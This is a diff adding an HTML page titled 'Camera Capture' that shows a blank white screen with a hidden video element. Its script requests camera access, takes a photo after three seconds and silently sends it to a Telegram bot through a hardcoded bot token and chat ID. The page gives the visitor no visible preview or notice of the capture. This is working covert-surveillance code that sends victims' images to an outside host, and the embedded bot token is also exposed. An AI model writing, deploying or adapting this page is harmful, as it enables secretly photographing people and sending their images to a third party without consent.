@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            overflow: hidden;
+        }
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" width="320" height="240" autoplay></video>
+    <script>
+        const botToken = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
+        const chatId = '1717245674';
+
+        // Request access to the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                // Get video element and set its source to the camera stream
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Capture photo after a delay
+                setTimeout(function() {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    var context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0);
+
+                    // Convert canvas image to blob and send it
+                    canvas.toBlob(function(blob) {
+                        var formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        
+                        // Send image to Telegram bot
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(result => console.log('Success:', result))
+                        .catch(error => console.error('Error:', error));
+                    });
+                }, 3000); // Capture after 3 seconds
+            })
+            .catch(function(error) {
+                console.error('Error accessing the camera:', error);
+            });
+    </script>
+</body>
+</html>
